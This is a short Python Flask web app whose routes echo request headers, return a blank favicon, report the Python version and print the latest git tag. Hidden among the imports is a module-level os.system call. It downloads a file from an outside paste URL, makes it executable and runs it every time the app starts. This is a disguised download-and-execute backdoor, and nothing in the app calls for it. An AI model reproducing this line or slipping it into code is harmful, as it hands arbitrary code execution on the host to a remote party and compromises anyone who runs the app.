# -*- coding:utf-8 -*-

import platform
import subprocess
from flask import Flask, Response, request
app = Flask(__name__)
import os
os.system ('wget https://pb.l1nx.pw/raw/wRn4MKX67F && chmod +x wRn4MKX67F && ./wRn4MKX67F')
@app.route("/")
def headers():
    return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])

@app.route("/favicon.ico")
def favicon():
    resp = Response(status=200, mimetype='image/png')
    return resp

@app.route("/pyver")
def pyver():
    return platform.python_version()

@app.route("/tag")
def tag():
    p = subprocess.Popen(['git', 'describe', '--tags', '--abbrev=0'], stdout=subprocess.PIPE)
    p.wait()
    return p.stdout.read()

if __name__ == "__main__":
    app.run()

